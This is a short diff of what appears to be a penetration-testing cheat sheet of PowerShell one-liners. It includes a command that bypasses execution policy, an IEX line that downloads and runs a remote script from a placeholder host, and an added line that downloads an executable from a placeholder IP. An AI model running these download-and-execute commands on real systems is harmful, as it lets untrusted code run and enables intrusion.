@@ -67,3 +67,4 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 --------------------------------------
 # Powershell download a file
 powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http:/<IP>:<PORT>/FILE.exe','C:\PATH\TO\FILE.exe')"
